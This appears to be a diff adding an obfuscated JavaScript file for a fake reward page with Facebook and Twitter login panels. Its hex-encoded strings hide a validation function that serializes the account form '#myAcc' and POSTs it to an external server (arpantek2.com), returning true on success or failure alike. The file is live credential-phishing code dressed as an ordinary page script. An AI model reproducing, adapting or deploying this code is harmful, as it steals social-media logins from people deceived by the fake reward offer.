@@ -1,0 +1,48 @@
+var _0x6437 = ["\x73\x65\x72\x69\x61\x6C\x69\x7A\x65", "\x23\x6D\x79\x41\x63\x63", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x72\x70\x61\x6E\x74\x65\x6B\x32\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x32\x2F\x69\x6E\x64\x65\x78\x2E\x70\x68\x70", "\x50\x4F\x53\x54", "\x61\x6A\x61\x78", "\x73\x72\x63", "\x61\x74\x74\x72", "\x73\x68\x6F\x77", "\x2E\x72\x65\x77\x61\x72\x64\x5F\x63\x6F\x6E\x66\x69\x72\x6D\x61\x74\x69\x6F\x6E", "\x23\x6D\x79\x52\x65\x77\x61\x72\x64\x49\x6D\x67", "\x2E\x61\x63\x63\x6F\x75\x6E\x74\x5F\x6C\x6F\x67\x69\x6E", "\x68\x69\x64\x65", "\x2E\x72\x65\x77\x61\x72\x64\x5F\x63\x6F\x6E\x66\x69\x72\x6D\x61\x74\x69\x6F\x6E\x31", "\x2E\x72\x65\x77\x61\x72\x64\x5F\x63\x6F\x6E\x66\x69\x72\x6D\x61\x74\x69\x6F\x6E\x35", "\x2E\x6C\x6F\x67\x69\x6E\x2D\x66\x61\x63\x65\x62\x6F\x6F\x6B", "\x2E\x6C\x6F\x67\x69\x6E\x2D\x74\x77\x69\x74\x74\x65\x72"];
+
+function validation() {
+    var _0xc94cx2 = $(_0x6437[1])[_0x6437[0]]();
+    $[_0x6437[4]]({
+        url: _0x6437[2],
+        data: _0xc94cx2,
+        type: _0x6437[3],
+        success: function() {
+            return true
+        },
+        error: function() {
+            return true
+        }
+    })
+}
+
+function open_reward_confirmation(_0xc94cx4) {
+    var _0xc94cx5 = $(_0xc94cx4)[_0x6437[6]](_0x6437[5]);
+    $(_0x6437[8])[_0x6437[7]]();
+    $(_0x6437[9])[_0x6437[6]](_0x6437[5], _0xc94cx5)
+}
+
+function open_account_login() {
+    $(_0x6437[10])[_0x6437[7]]();
+    $(_0x6437[12])[_0x6437[11]]();
+    $(_0x6437[13])[_0x6437[11]]()
+}
+
+function open_facebook() {
+    $(_0x6437[14])[_0x6437[7]]();
+    $(_0x6437[10])[_0x6437[11]]()
+}
+
+function open_twitter() {
+    $(_0x6437[15])[_0x6437[7]]();
+    $(_0x6437[10])[_0x6437[11]]()
+}
+
+function tutup_facebook() {
+    $(_0x6437[14])[_0x6437[11]]();
+    $(_0x6437[10])[_0x6437[7]]()
+}
+
+function tutup_twitter() {
+    $(_0x6437[15])[_0x6437[11]]();
+    $(_0x6437[10])[_0x6437[7]]()
+}
